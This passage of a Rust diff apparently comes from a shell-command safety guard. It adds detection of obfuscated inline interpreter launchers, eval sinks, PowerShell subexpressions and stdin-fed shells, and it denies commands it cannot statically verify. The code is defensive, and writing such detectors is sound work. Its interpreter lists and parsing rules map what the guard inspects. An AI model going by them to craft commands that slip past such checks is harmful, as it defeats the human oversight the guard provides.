+            if let Some(allowlist_override) = result.allowlist_override.take() {
+                let mut matched = allowlist_override.matched;
+                // Nested offsets describe decoded launcher payload bytes, not
+                // the outer command. Preserve rule identity but never expose
+                // a misleading source location.
+                matched.matched_span = None;
+                matched.matched_text_preview = None;
+                *first_allowlist_hit =
+                    Some((matched, allowlist_override.layer, allowlist_override.reason));
+            }
+        }
+    }
+    if all_segments_are_envelopes {
+        // Every executable segment has already been decoded in its actual
+        // inner dialect and recursively evaluated. Continuing into the outer
+        // heredoc/regex passes would parse the launcher's argv as outer-shell
+        // source and can turn an inert PowerShell ScriptBlock value back into
+        // an apparent command. Compound commands with any non-envelope segment
+        // deliberately fall through so those remaining segments are checked.
+        return Some(first_allowlist_hit.take().map_or_else(
+            EvaluationResult::allowed,
+            |(matched, layer, reason)| {
+                EvaluationResult::allowed_by_allowlist(matched, layer, reason)
+            },
+        ));
+    }
+    None
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct PosixInlineLauncherEnvelope {
+    command: String,
+    launcher: String,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+enum PosixInlineLauncherParse {
+    NotLauncher,
+    Envelope(PosixInlineLauncherEnvelope),
+    Unverified(String),
+}
+
+fn posix_inline_shell_name(name: &str) -> bool {
+    matches!(name, "bash" | "sh" | "zsh" | "fish" | "ksh" | "dash")
+}
+
+fn non_shell_inline_interpreter_name(name: &str) -> bool {
+    [
+        "python", "python3", "ruby", "irb", "perl", "node", "nodejs", "php", "lua",
+    ]
+    .iter()
+    .any(|prefix| {
+        name == *prefix
+            || name.strip_prefix(prefix).is_some_and(|suffix| {
+                !suffix.is_empty()
+                    && suffix
+                        .bytes()
+                        .all(|byte| byte.is_ascii_digit() || byte == b'.')
+            })
+    })
+}
+
+fn decoded_posix_executable_name(raw: &str) -> Option<String> {
+    let decoded = shell_word_value(raw, ShellDialect::Posix)?;
+    let basename = decoded.rsplit('/').next().unwrap_or(&decoded);
+    (!basename.is_empty()).then(|| basename.to_ascii_lowercase())
+}
+
+fn posix_executable_word_is_plain(raw: &str) -> bool {
+    !raw.bytes().any(|byte| {
+        matches!(
+            byte,
+            b'\'' | b'"' | b'\\' | b'$' | b'`' | b'*' | b'?' | b'[' | b'{' | b'~'
+        )
+    })
+}
+
+fn contains_dynamic_posix_substitution(raw: &str) -> bool {
+    raw.contains(crate::packs::core::git::POSIX_DYNAMIC_QUOTED)
+        || raw.contains(crate::packs::core::git::POSIX_DYNAMIC_UNQUOTED)
+}
+
+fn posix_inline_flag_position(name: Option<&str>, words: &[&str]) -> Option<usize> {
+    words.iter().enumerate().skip(1).find_map(|(index, raw)| {
+        let flag = shell_word_value(raw, ShellDialect::Posix)?;
+        if !flag.starts_with('-') || flag == "-" {
+            return None;
+        }
+        let lower = flag.to_ascii_lowercase();
+        let is_inline = if let Some(name) = name {
+            if posix_inline_shell_name(name) {
+                lower == "--command"
+                    || lower
+                        .strip_prefix('-')
+                        .is_some_and(|short| !short.starts_with('-') && short.contains('c'))
+            } else if name.starts_with("python") {
+                matches!(lower.as_str(), "-c" | "-e")
+            } else if matches!(name, "ruby" | "irb" | "perl" | "lua")
+                || name.starts_with("ruby")
+                || name.starts_with("perl")
+                || name.starts_with("lua")
+            {
+                matches!(flag.as_str(), "-e" | "-E")
+            } else if name.starts_with("node") {
+                matches!(lower.as_str(), "-e" | "--eval" | "-p" | "--print")
+            } else if name.starts_with("php") {
+                lower == "-r"
+            } else {
+                false
+            }
+        } else {
+            matches!(
+                lower.as_str(),
+                "-c" | "-e" | "-p" | "-r" | "--eval" | "--print" | "--command"
+            ) || lower
+                .strip_prefix('-')
+                .is_some_and(|short| !short.starts_with('-') && short.contains('c'))
+        };
+        is_inline.then_some(index)
+    })
+}
+
+fn parse_obfuscated_posix_inline_launcher_segment(
+    segment: &str,
+    max_payload_bytes: usize,
+) -> PosixInlineLauncherParse {
+    let stripped = strip_wrapper_prefixes(segment);
+    let original_segment = stripped.normalized.as_ref();
+    let original_raw_executable = tokenize_for_shell_dialect(original_segment, ShellDialect::Posix)
+        .into_iter()
+        .find(|token| token.kind == NormalizeTokenKind::Word)
+        .and_then(|token| token.text(original_segment));
+    let substitution_view = crate::packs::core::git::posix_substitution_view(original_segment)
+        .ok()
+        .filter(|view| view.command != original_segment);
+    let segment = substitution_view
+        .as_ref()
+        .map_or(original_segment, |view| view.command.as_str());
+    let tokens = tokenize_for_shell_dialect(segment, ShellDialect::Posix);
+    if tokens
+        .iter()
+        .any(|token| token.kind == NormalizeTokenKind::Separator)
+    {
+        return PosixInlineLauncherParse::NotLauncher;
+    }
+    let words: Vec<&str> = tokens
+        .iter()
+        .filter(|token| token.kind == NormalizeTokenKind::Word)
+        .filter_map(|token| token.text(segment))
+        .collect();
+    let Some(raw_executable) = words.first().copied() else {
+        return PosixInlineLauncherParse::NotLauncher;
+    };
+    let executable_was_statically_resolved = original_raw_executable
+        .is_some_and(|original| original != raw_executable)
+        && !contains_dynamic_posix_substitution(raw_executable);
+
+    let decoded_name = decoded_posix_executable_name(raw_executable);
+    let dynamic_executable = contains_dynamic_posix_substitution(raw_executable)
+        || decoded_name.is_none()
+        || decoded_name.as_ref().is_some_and(|name| {
+            name.bytes()
+                .any(|byte| matches!(byte, b'$' | b'`' | b'*' | b'?' | b'[' | b'{' | b'(' | b')'))
+        });
+    if dynamic_executable {
+        return if posix_inline_flag_position(None, &words).is_some() {
+            PosixInlineLauncherParse::Unverified(
+                "a dynamically assembled executable is followed by an inline-code flag".to_string(),
+            )
+        } else {
+            PosixInlineLauncherParse::NotLauncher
+        };
+    }
+
+    let name = decoded_name.expect("dynamic executable returned above");
+    let recognized = posix_inline_shell_name(&name) || non_shell_inline_interpreter_name(&name);
+    if !recognized
+        || (posix_executable_word_is_plain(raw_executable) && !executable_was_statically_resolved)
+    {
+        return PosixInlineLauncherParse::NotLauncher;
+    }
+    let Some(flag_index) = posix_inline_flag_position(Some(&name), &words) else {
+        return PosixInlineLauncherParse::NotLauncher;
+    };
+    if words
+        .get(flag_index)
+        .is_some_and(|raw_flag| contains_dynamic_posix_substitution(raw_flag))
+    {
+        return PosixInlineLauncherParse::Unverified(format!(
+            "obfuscated inline {name} flag cannot be statically decoded"
+        ));
+    }
+
+    if !posix_inline_shell_name(&name) {
+        return PosixInlineLauncherParse::Unverified(format!(
+            "obfuscated inline {name} source requires language-aware extraction"
+        ));
+    }
+    let Some(raw_payload) = words.get(flag_index + 1) else {
+        return PosixInlineLauncherParse::Unverified(format!(
+            "obfuscated inline {name} launcher has no payload"
+        ));
+    };
+    if contains_dynamic_posix_substitution(raw_payload) {
+        return PosixInlineLauncherParse::Unverified(format!(
+            "obfuscated inline {name} payload contains a dynamic command substitution"
+        ));
+    }
+    let Some(payload) = shell_word_value(raw_payload, ShellDialect::Posix) else {
+        return PosixInlineLauncherParse::Unverified(format!(
+            "obfuscated inline {name} payload cannot be statically decoded"
+        ));
+    };
+    match validate_launcher_payload(payload, ShellDialect::Posix, max_payload_bytes) {
+        Ok(command) => PosixInlineLauncherParse::Envelope(PosixInlineLauncherEnvelope {
+            command,
+            launcher: format!("obfuscated {name} inline launcher"),
+        }),
+        Err(reason) => PosixInlineLauncherParse::Unverified(reason),
+    }
+}
+
+#[allow(clippy::too_many_arguments)]
+fn evaluate_obfuscated_posix_inline_launchers(
+    command: &str,
+    outer_dialect: ShellDialect,
+    nested_command_depth: usize,
+    enabled_keywords: &[&str],
+    ordered_packs: &[String],
+    keyword_index: Option<&crate::packs::EnabledKeywordIndex>,
+    compiled_overrides: &crate::config::CompiledOverrides,
+    allowlists: &LayeredAllowlist,
+    heredoc_settings: &crate::config::HeredocSettings,
+    allow_once_audit: Option<&crate::pending_exceptions::AllowOnceAuditConfig<'_>>,
+    project_path: Option<&Path>,
+    deadline: Option<&Deadline>,
+    first_allowlist_hit: &mut Option<(PatternMatch, AllowlistLayer, String)>,
+    inherited_automated_stdin: bool,
+) -> Option<EvaluationResult> {
+    if !matches!(outer_dialect, ShellDialect::Posix | ShellDialect::Unknown) {
+        return None;
+    }
+    let max_payload_bytes = heredoc_settings
+        .limits
+        .max_body_bytes
+        .min(MAX_WINDOWS_LAUNCHER_PAYLOAD_BYTES);
+    for segment in crate::packs::split_command_segments_in_dialect(command, ShellDialect::Posix) {
+        let segment_start = segment.as_ptr() as usize - command.as_ptr() as usize;
+        let envelope =
+            match parse_obfuscated_posix_inline_launcher_segment(segment, max_payload_bytes) {
+                PosixInlineLauncherParse::NotLauncher => continue,
+                PosixInlineLauncherParse::Unverified(reason) => {
+                    return Some(EvaluationResult::denied_by_legacy(&format!(
+                        "Inline interpreter launcher cannot be statically verified: {reason}"
+                    )));
+                }
+                PosixInlineLauncherParse::Envelope(envelope) => envelope,
+            };
+
+        let envelope_automated_stdin = inherited_automated_stdin
+            || crate::packs::core::filesystem::rm_segment_receives_automated_stdin(
+                command,
+                segment_start,
+                outer_dialect,
+            );
+        let mut result = evaluate_command_with_pack_order_deadline_at_path_inner(
+            &envelope.command,
+            enabled_keywords,
+            ordered_packs,
+            keyword_index,
+            compiled_overrides,
+            allowlists,
+            heredoc_settings,
+            allow_once_audit,
+            project_path,
+            deadline,
+            ShellDialect::Posix,
+            nested_command_depth + 1,
+            envelope_automated_stdin,
+        );
+        if result.skipped_due_to_budget {
+            return Some(EvaluationResult::denied_by_legacy(&format!(
+                "{} payload exceeded dcg's static-analysis deadline",
+                envelope.launcher
+            )));
+        }
+        if result.is_denied() {
+            if let Some(info) = result.pattern_info.as_mut() {
+                info.reason = format!(
+                    "{} executes an embedded command: {}",
+                    envelope.launcher, info.reason
+                );
+                info.matched_span = None;
+                info.matched_text_preview = None;
+            }
+            return Some(result);
+        }
+        if first_allowlist_hit.is_none() {
+            if let Some(allowlist_override) = result.allowlist_override.take() {
+                let mut matched = allowlist_override.matched;
+                matched.matched_span = None;
+                matched.matched_text_preview = None;
+                *first_allowlist_hit =
+                    Some((matched, allowlist_override.layer, allowlist_override.reason));
+            }
+        }
+    }
+    None
+}
+
+fn powershell_here_string_end(command: &str, start: usize) -> Option<(u8, usize, usize)> {
+    let bytes = command.as_bytes();
+    let quote = *bytes.get(start + 1)?;
+    if bytes.get(start) != Some(&b'@') || !matches!(quote, b'\'' | b'"') {
+        return None;
+    }
+
+    // PowerShell permits horizontal Unicode whitespace between a here-string
+    // header and its physical newline. Keep this grammar aligned with the raw
+    // tokenizer: otherwise the tokenizer correctly hides body separators while
+    // the evaluator fails to restore or inspect executable-looking string data.
+    let mut header_end = start + 2;
+    let content_start = loop {
+        let character = command.get(header_end..)?.chars().next()?;
+        match character {
+            '\r' if bytes.get(header_end + 1) == Some(&b'\n') => break header_end + 2,
+            '\r' | '\n' => break header_end + 1,
+            horizontal if horizontal.is_whitespace() => header_end += horizontal.len_utf8(),
+            _ => return None,
+        }
+    };
+
+    let mut line_start = content_start;
+    while line_start < bytes.len() {
+        if bytes.get(line_start) == Some(&quote) && bytes.get(line_start + 1) == Some(&b'@') {
+            return Some((quote, content_start, line_start + 2));
+        }
+        let mut newline = line_start;
+        while newline < bytes.len() && !matches!(bytes[newline], b'\r' | b'\n') {
+            newline += 1;
+        }
+        if newline == bytes.len() {
+            break;
+        }
+        line_start = if bytes.get(newline..newline + 2) == Some(b"\r\n") {
+            newline + 2
+        } else {
+            newline + 1
+        };
+    }
+    None
+}
+
+fn skip_powershell_block_comment(command: &str, start: usize) -> usize {
+    let bytes = command.as_bytes();
+    let mut index = start + 2;
+    let mut depth = 1usize;
+    while index < bytes.len() {
+        if bytes.get(index..index + 2) == Some(b"<#") {
+            depth += 1;
+            index += 2;
+        } else if bytes.get(index..index + 2) == Some(b"#>") {
+            depth -= 1;
+            index += 2;
+            if depth == 0 {
+                return index;
+            }
+        } else {
+            index += 1;
+        }
+    }
+    bytes.len()
+}
+
+fn skip_powershell_single_quote(command: &str, start: usize) -> usize {
+    let bytes = command.as_bytes();
+    let mut index = start + 1;
+    while index < bytes.len() {
+        if bytes[index] == b'\'' {
+            if bytes.get(index + 1) == Some(&b'\'') {
+                index += 2;
+            } else {
+                return index + 1;
+            }
+        } else {
+            index += 1;
+        }
+    }
+    bytes.len()
+}
+
+fn find_powershell_subexpression_close(command: &str, body_start: usize) -> Result<usize, ()> {
+    let bytes = command.as_bytes();
+    let mut index = body_start;
+    let mut depth = 1usize;
+    while index < bytes.len() {
+        match bytes[index] {
+            b'`' => index = (index + 2).min(bytes.len()),
+            b'#' if powershell_hash_role(bytes, index) == PowerShellHashRole::Comment => {
+                index = command[index..]
+                    .find('\n')
+                    .map_or(bytes.len(), |newline| index + newline + 1);
+            }
+            b'#' if powershell_hash_role(bytes, index) == PowerShellHashRole::Ambiguous => {
+                return Err(());
+            }
+            b'<' if bytes.get(index + 1) == Some(&b'#') => {
+                index = skip_powershell_block_comment(command, index);
+            }
+            b'\'' => index = skip_powershell_single_quote(command, index),
+            b'"' => {
+                index += 1;
+                while index < bytes.len() {
+                    if bytes[index] == b'`' {
+                        index = (index + 2).min(bytes.len());
+                    } else if bytes[index] == b'"' {
+                        index += 1;
+                        break;
+                    } else if bytes[index] == b'$' && bytes.get(index + 1) == Some(&b'(') {
+                        let close = find_powershell_subexpression_close(command, index + 2)?;
+                        index = close + 1;
+                    } else {
+                        index += 1;
+                    }
+                }
+            }
+            b'@' if matches!(bytes.get(index + 1), Some(b'\'' | b'"')) => {
+                if let Some((_, _, end)) = powershell_here_string_end(command, index) {
+                    index = end;
+                } else {
+                    index += 1;
+                }
+            }
+            b'$' if bytes.get(index + 1) == Some(&b'(') => {
+                let close = find_powershell_subexpression_close(command, index + 2)?;
+                index = close + 1;
+            }
+            b'(' => {
+                depth += 1;
+                index += 1;
+            }
+            b')' => {
+                depth -= 1;
+                if depth == 0 {
+                    return Ok(index);
+                }
+                index += 1;
+            }
+            _ => index += 1,
+        }
+    }
+    Err(())
+}
+
+fn collect_powershell_expandable_region(
+    command: &str,
+    start: usize,
+    end: usize,
+    bodies: &mut Vec<String>,
+) -> Result<(), ()> {
+    let bytes = command.as_bytes();
+    let mut index = start;
+    while index < end {
+        if bytes[index] == b'`' {
+            index = (index + 2).min(end);
+        } else if bytes[index] == b'$' && bytes.get(index + 1) == Some(&b'(') {
+            let close = find_powershell_subexpression_close(command, index + 2)?;
+            if close > end {
+                return Err(());
+            }
+            bodies.push(powershell_substitution_body_for_evaluation(
+                &command[index + 2..close],
+            ));
+            index = close + 1;
+        } else {
+            index += 1;
+        }
+    }
+    Ok(())
+}
+
+fn powershell_substitution_body_for_evaluation(body: &str) -> String {
+    // A ScriptBlock returned by `$()` can be executed by many consumers: the
+    // call and dot-source operators, `.Invoke()`, `Invoke-Command`, jobs, and
+    // pipeline cmdlets are only the obvious examples. Consumer-sensitive
+    // recognition is therefore unsound. Inspect every statically visible
+    // ScriptBlock body conservatively; a standalone top-level `{ ... }`
+    // expression remains inert and is handled separately by the evaluator.
+    if is_static_powershell_script_block_expression(body) {
+        trim_powershell_script_block(body).to_string()
+    } else {
+        body.to_string()
+    }
+}
+
+fn collect_powershell_substitution_bodies(command: &str) -> Result<Vec<String>, ()> {
+    let bytes = command.as_bytes();
+    let mut bodies = Vec::new();
+    let mut index = 0usize;
+    while index < bytes.len() {
+        match bytes[index] {
+            b'`' => index = (index + 2).min(bytes.len()),
+            b'#' if powershell_hash_role(bytes, index) == PowerShellHashRole::Comment => {
+                index = command[index..]
+                    .find('\n')
+                    .map_or(bytes.len(), |newline| index + newline + 1);
+            }
+            b'#' if powershell_hash_role(bytes, index) == PowerShellHashRole::Ambiguous => {
+                return Err(());
+            }
+            b'<' if bytes.get(index + 1) == Some(&b'#') => {
+                index = skip_powershell_block_comment(command, index);
+            }
+            b'\'' => index = skip_powershell_single_quote(command, index),
+            b'"' => {
+                index += 1;
+                while index < bytes.len() {
+                    if bytes[index] == b'`' {
+                        index = (index + 2).min(bytes.len());
+                    } else if bytes[index] == b'$' && bytes.get(index + 1) == Some(&b'(') {
+                        let close = find_powershell_subexpression_close(command, index + 2)?;
+                        bodies.push(powershell_substitution_body_for_evaluation(
+                            &command[index + 2..close],
+                        ));
+                        index = close + 1;
+                    } else if bytes[index] == b'"' {
+                        index += 1;
+                        break;
+                    } else {
+                        index += 1;
+                    }
+                }
+            }
+            b'@' if matches!(bytes.get(index + 1), Some(b'\'' | b'"')) => {
+                if let Some((quote, content_start, end)) =
+                    powershell_here_string_end(command, index)
+                {
+                    if quote == b'"' {
+                        collect_powershell_expandable_region(
+                            command,
+                            content_start,
+                            end.saturating_sub(2),
+                            &mut bodies,
+                        )?;
+                    }
+                    index = end;
+                } else {
+                    index += 1;
+                }
+            }
+            b'$' if bytes.get(index + 1) == Some(&b'(') => {
+                let close = find_powershell_subexpression_close(command, index + 2)?;
+                bodies.push(powershell_substitution_body_for_evaluation(
+                    &command[index + 2..close],
+                ));
+                index = close + 1;
+            }
+            _ => index += 1,
+        }
+    }
+    Ok(bodies)
+}
+
+/// Collect command-shaped `$()` text from verbatim PowerShell here-strings.
+///
+/// PowerShell does not expand a single-quoted here-string when constructing
+/// the value.  A nested value can nevertheless flow into `&`, dot-sourcing,
+/// `Invoke-Expression`, or another execution sink after this statement.  Until
+/// that consumer data flow is proven inert, inspect the statically visible
+/// `$()` bodies conservatively.  Standalone here-string expressions are
+/// exempted earlier by `is_static_powershell_string_expression` and never
+/// reach this collector.
+fn collect_powershell_verbatim_here_string_substitution_bodies(
+    command: &str,
+) -> Result<Vec<String>, ()> {
+    let bytes = command.as_bytes();
+    let mut bodies = Vec::new();
+    let mut index = 0usize;
+    while index < bytes.len() {
+        match bytes[index] {
+            b'`' => index = (index + 2).min(bytes.len()),
+            b'#' if powershell_hash_role(bytes, index) == PowerShellHashRole::Comment => {
+                index = command[index..]
+                    .find('\n')
+                    .map_or(bytes.len(), |newline| index + newline + 1);
+            }
+            b'#' if powershell_hash_role(bytes, index) == PowerShellHashRole::Ambiguous => {
+                return Err(());
+            }
+            b'<' if bytes.get(index + 1) == Some(&b'#') => {
+                index = skip_powershell_block_comment(command, index);
+            }
+            b'\'' => index = skip_powershell_single_quote(command, index),
+            b'"' => {
+                index += 1;
+                while index < bytes.len() {
+                    if bytes[index] == b'`' {
+                        index = (index + 2).min(bytes.len());
+                    } else if bytes[index] == b'"' {
+                        index += 1;
+                        break;
+                    } else {
+                        index += 1;
+                    }
+                }
+            }
+            b'@' if matches!(bytes.get(index + 1), Some(b'\'' | b'"')) => {
+                let Some((quote, content_start, end)) = powershell_here_string_end(command, index)
+                else {
+                    index += 1;
+                    continue;
+                };
+                if quote == b'\'' {
+                    collect_powershell_expandable_region(
+                        command,
+                        content_start,
+                        end.saturating_sub(2),
+                        &mut bodies,
+                    )?;
+                }
+                index = end;
+            }
+            _ => index += 1,
+        }
+    }
+    Ok(bodies)
+}
+
+fn mask_powershell_block_comments(command: &str) -> Cow<'_, str> {
+    let bytes = command.as_bytes();
+    let mut index = 0usize;
+    let mut masked: Option<Vec<u8>> = None;
+    while index < bytes.len() {
+        match bytes[index] {
+            b'`' => index = (index + 2).min(bytes.len()),
+            b'#' if powershell_hash_role(bytes, index) == PowerShellHashRole::Comment => {
+                index = command[index..]
+                    .find('\n')
+                    .map_or(bytes.len(), |newline| index + newline + 1);
+            }
+            b'\'' => index = skip_powershell_single_quote(command, index),
+            b'"' => {
+                index += 1;
+                while index < bytes.len() {
+                    if bytes[index] == b'`' {
+                        index = (index + 2).min(bytes.len());
+                    } else if bytes[index] == b'"' {
+                        index += 1;
+                        break;
+                    } else {
+                        index += 1;
+                    }
+                }
+            }
+            b'@' if matches!(bytes.get(index + 1), Some(b'\'' | b'"')) => {
+                index =
+                    powershell_here_string_end(command, index).map_or(index + 1, |(_, _, end)| end);
+            }
+            b'<' if bytes.get(index + 1) == Some(&b'#') => {
+                let end = skip_powershell_block_comment(command, index);
+                masked.get_or_insert_with(|| bytes.to_vec())[index..end].fill(b' ');
+                index = end;
+            }
+            _ => index += 1,
+        }
+    }
+    masked.map_or(Cow::Borrowed(command), |bytes| {
+        Cow::Owned(String::from_utf8(bytes).expect("ASCII masking preserves UTF-8 boundaries"))
+    })
+}
+
+/// Recognize a standalone PowerShell string expression.
+///
+/// This permits an entire top-level literal to remain inert. Nested string
+/// values deliberately remain visible to ordinary pack analysis because a
+/// consumer can execute them via `&`, dot-sourcing, `Invoke-Expression`, or a
+/// related sink. Double-quoted literals containing an executable subexpression
+/// are never static: the recursive pass must inspect their `$()` body first.
+fn is_static_powershell_string_expression(expression: &str) -> bool {
+    let expression = expression.trim();
+    if let Some((_, _, end)) = powershell_here_string_end(expression, 0) {
+        return expression[end..].trim().is_empty()
+            && collect_powershell_substitution_bodies(expression)
+                .is_ok_and(|bodies| bodies.is_empty());
+    }
+    let Some(quote) = expression.as_bytes().first().copied() else {
+        return false;
+    };
+    if !matches!(quote, b'\'' | b'"') {
+        return false;
+    }
+
+    let bytes = expression.as_bytes();
+    let mut index = 1usize;
+    while index < bytes.len() {
+        match quote {
+            b'\'' if bytes[index] == b'\'' => {
+                if bytes.get(index + 1) == Some(&b'\'') {
+                    index += 2;
+                    continue;
+                }
+                return expression[index + 1..].trim().is_empty();
+            }
+            b'"' if bytes[index] == b'`' => {
+                index += 2;
+            }
+            b'"' if bytes[index] == b'$' && bytes.get(index + 1) == Some(&b'(') => {
+                return false;
+            }
+            b'"' if bytes[index] == b'"' => {
+                return expression[index + 1..].trim().is_empty();
+            }
+            _ => index += 1,
+        }
+    }
+    false
+}
+
+const MAX_EXECUTABLE_TEXT_SINKS: usize = 32;
+const MAX_STATIC_SHELL_SOURCE_TERMS: usize = 128;
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+enum ExecutableTextSink {
+    Payload {
+        source: String,
+        dialect: ShellDialect,
+        context: &'static str,
+    },
+    Unverified(&'static str),
+}
+
+struct PowerShellStaticStringParser<'a> {
+    expression: &'a str,
+    index: usize,
+    terms: usize,
+}
+
+impl<'a> PowerShellStaticStringParser<'a> {
+    fn new(expression: &'a str) -> Self {
+        Self {
+            expression,
+            index: 0,
+            terms: 0,
+        }
+    }
+
+    fn skip_whitespace(&mut self) {
+        while let Some(ch) = self.expression[self.index..].chars().next() {
+            if !ch.is_whitespace() {
+                break;
+            }
+            self.index += ch.len_utf8();
+        }
+    }
+
+    fn parse(mut self) -> Result<String, ()> {
+        if self.expression.len() > MAX_WINDOWS_LAUNCHER_PAYLOAD_BYTES {
+            return Err(());
+        }
+        self.skip_whitespace();
+        let value = self.parse_concatenation(0)?;
+        self.skip_whitespace();
+        (self.index == self.expression.len())
+            .then_some(value)
+            .ok_or(())
+    }
+
+    fn parse_concatenation(&mut self, depth: usize) -> Result<String, ()> {
+        if depth > MAX_EMBEDDED_SHELL_DEPTH {
+            return Err(());
+        }
+        let mut value = self.parse_primary(depth)?;
+        loop {
+            self.skip_whitespace();
+            if self.expression.as_bytes().get(self.index) != Some(&b'+') {
+                return Ok(value);
+            }
+            self.index += 1;
+            self.skip_whitespace();
+            let suffix = self.parse_primary(depth)?;
+            if value.len().saturating_add(suffix.len()) > MAX_WINDOWS_LAUNCHER_PAYLOAD_BYTES {
+                return Err(());
+            }
+            value.push_str(&suffix);
+        }
+    }
+
+    fn parse_primary(&mut self, depth: usize) -> Result<String, ()> {
+        self.skip_whitespace();
+        self.terms = self.terms.saturating_add(1);
+        if self.terms > MAX_STATIC_SHELL_SOURCE_TERMS {
+            return Err(());
+        }
+        match self.expression.as_bytes().get(self.index).copied() {
+            Some(b'\'') => self.parse_single_quoted(),
+            Some(b'"') => self.parse_double_quoted(),
+            Some(b'(') => {
+                self.index += 1;
+                let value = self.parse_concatenation(depth + 1)?;
+                self.skip_whitespace();
+                if self.expression.as_bytes().get(self.index) != Some(&b')') {
+                    return Err(());
+                }
+                self.index += 1;
+                Ok(value)
+            }
+            _ => Err(()),
+        }
+    }
+
+    fn parse_single_quoted(&mut self) -> Result<String, ()> {
+        self.index += 1;
+        let mut value = String::new();
+        while self.index < self.expression.len() {
+            let ch = self.expression[self.index..].chars().next().ok_or(())?;
+            if ch == '\'' {
+                if self.expression.as_bytes().get(self.index + 1) == Some(&b'\'') {
+                    value.push('\'');
+                    self.index += 2;
+                    continue;
+                }
+                self.index += 1;
+                return Ok(value);
+            }
+            value.push(ch);
+            self.index += ch.len_utf8();
+        }
+        Err(())
+    }
+
+    fn parse_double_quoted(&mut self) -> Result<String, ()> {
+        self.index += 1;
+        let mut value = String::new();
+        while self.index < self.expression.len() {
+            let ch = self.expression[self.index..].chars().next().ok_or(())?;
+            match ch {
+                '"' => {
+                    self.index += 1;
+                    return Ok(value);
+                }
+                '$' => return Err(()),
+                '`' => {
+                    self.index += 1;
+                    let escaped = self.expression[self.index..].chars().next().ok_or(())?;
+                    self.index += escaped.len_utf8();
+                    match escaped {
+                        '0' => value.push('\0'),
+                        'a' => value.push('\u{0007}'),
+                        'b' => value.push('\u{0008}'),
+                        'e' => value.push('\u{001b}'),
+                        'f' => value.push('\u{000c}'),
+                        'n' => value.push('\n'),
+                        'r' => value.push('\r'),
+                        't' => value.push('\t'),
+                        'v' => value.push('\u{000b}'),
+                        '\n' => {}
+                        '\r' if self.expression.as_bytes().get(self.index) == Some(&b'\n') => {
+                            self.index += 1;
+                        }
+                        other => value.push(other),
+                    }
+                }
+                other => {
+                    value.push(other);
+                    self.index += other.len_utf8();
+                }
+            }
+        }
+        Err(())
+    }
+}
+
+fn parse_static_powershell_source(expression: &str) -> Result<String, ()> {
+    PowerShellStaticStringParser::new(expression).parse()
+}
+
+fn posix_eval_word_has_dynamic_source(raw: &str) -> bool {
+    let mut chars = raw.chars().peekable();
+    let mut single = false;
+    let mut double = false;
+    while let Some(ch) = chars.next() {
+        match ch {
+            '\\' if !single => {
+                chars.next();
+            }
+            '\'' if !double => single = !single,
+            '"' if !single => double = !double,
+            '$' if !single && chars.peek() == Some(&'\'') => {
+                chars.next();
+                single = true;
+            }
+            '$' if !single && chars.peek() == Some(&'"') => {
+                chars.next();
+                double = true;
+            }
+            '$' | '`' if !single => return true,
+            '*' | '?' | '[' | '{' | '~' if !single && !double => return true,
+            '<' | '>' if !single && chars.peek() == Some(&'(') => return true,
+            _ => {}
+        }
+    }
+    single || double
+}
+
+fn static_posix_eval_source(argument_text: &str) -> Result<String, ()> {
+    if argument_text.len() > MAX_WINDOWS_LAUNCHER_PAYLOAD_BYTES {
+        return Err(());
+    }
+    let tokens = tokenize_for_shell_dialect(argument_text, ShellDialect::Posix);
+    if tokens
+        .iter()
+        .any(|token| token.kind == NormalizeTokenKind::Separator)
+    {
+        return Err(());
+    }
+    let mut decoder = ShellTokenDecoder::new(ShellDialect::Posix);
+    let mut words = Vec::new();
+    for token in tokens
+        .iter()
+        .filter(|token| token.kind == NormalizeTokenKind::Word)
+    {
+        if words.len() >= MAX_STATIC_SHELL_SOURCE_TERMS {
+            return Err(());
+        }
+        let raw = token.text(argument_text).ok_or(())?;
+        if posix_eval_word_has_dynamic_source(raw) {
+            return Err(());
+        }
+        let decoded = decoder
+            .decode(raw, ShellTokenRole::Syntax)
+            .ok_or(())?
+            .into_owned();
+        words.push(decoded);
+    }
+    Ok(words.join(" "))
+}
+
+fn collect_posix_eval_sinks(command: &str, sinks: &mut Vec<ExecutableTextSink>) {
+    for segment in crate::packs::split_command_segments_in_dialect(command, ShellDialect::Posix) {
+        if sinks.len() >= MAX_EXECUTABLE_TEXT_SINKS {
+            sinks.push(ExecutableTextSink::Unverified(
+                "command contains too many executable text sinks for bounded analysis",
+            ));
+            return;
+        }
+        let tokens = tokenize_for_shell_dialect(segment, ShellDialect::Posix);
+        let words: Vec<_> = tokens
+            .iter()
+            .filter(|token| token.kind == NormalizeTokenKind::Word)
+            .collect();
+        let mut decoder = ShellTokenDecoder::new(ShellDialect::Posix);
+        let mut index = 0usize;
+        while let Some(token) = words.get(index) {
+            let Some(raw) = token.text(segment) else {
+                break;
+            };
+            let Some(decoded) = decoder.decode(raw, ShellTokenRole::Syntax) else {
+                index += 1;
+                continue;
+            };
+            if crate::normalize::is_env_assignment(decoded.as_ref()) {
+                index += 1;
+                continue;
+            }
+            if matches!(decoded.as_ref(), "command" | "builtin") {
+                index += 1;
+            }
+            break;
+        }
+        let Some(token) = words.get(index) else {
+            continue;
+        };
+        let Some(raw_command) = token.text(segment) else {
+            continue;
+        };
+        let mut command_decoder = ShellTokenDecoder::new(ShellDialect::Posix);
+        let Some(decoded_command) = command_decoder.decode(raw_command, ShellTokenRole::Syntax)
+        else {
+            continue;
+        };
+        if decoded_command.as_ref() != "eval" {
+            continue;
+        }
+        let arguments = segment
+            .get(token.byte_range.end..)
+            .map(str::trim)
+            .unwrap_or_default();
+        match static_posix_eval_source(arguments) {
+            Ok(source) => sinks.push(ExecutableTextSink::Payload {
+                source,
+                dialect: ShellDialect::Posix,
+                context: "POSIX eval executes an embedded shell command",
+            }),
+            Err(()) => sinks.push(ExecutableTextSink::Unverified(
+                "POSIX eval receives source that dcg cannot statically verify",
+            )),
+        }
+    }
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum PipelineShellInputMode {
+    NotShell,
+    ReadsStdin,
+    DoesNotReadStdin,
+    Unverified,
+}
+
+/// Classify whether a POSIX shell invocation consumes its standard input as
+/// shell source. A bare `sh`/`bash`/etc. does; `-c CODE` and a positional
+/// script path do not. `-s` explicitly restores stdin-source mode even when
+/// positional arguments follow it.
+fn pipeline_shell_input_mode(command: &str) -> PipelineShellInputMode {
+    let Some((executable, args)) = command_tokens(command) else {
+        return PipelineShellInputMode::NotShell;
+    };
+    if !matches!(
+        executable.as_str(),
+        "sh" | "bash" | "zsh" | "fish" | "ksh" | "dash"
